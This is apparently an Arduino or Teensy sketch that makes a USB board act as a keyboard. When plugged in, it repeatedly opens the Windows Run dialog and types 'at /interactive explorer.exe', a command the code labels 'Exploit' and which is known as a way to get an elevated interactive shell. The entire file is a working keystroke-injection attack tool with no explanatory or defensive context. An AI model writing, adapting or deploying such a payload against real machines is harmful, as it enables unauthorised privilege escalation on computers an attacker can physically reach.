int ledPin = 11;

void setup(){}

void loop(){
  // Start
  delay(1000);
  digitalWrite(ledPin, HIGH);

  // Exploit
  WindowsPayload();

  // End
  digitalWrite(ledPin, LOW);
  delay(15000); // Long delay between runs
}

void WindowsPayload(){
  WindowsCommandRun("at /interactive explorer.exe");
}

// Utility functions
void WindowsCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_R);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void KeyPress(int SomeKey) {
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void KeyCombo(int ModKey,int SomeKey) {
  Keyboard.set_modifier(ModKey);
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

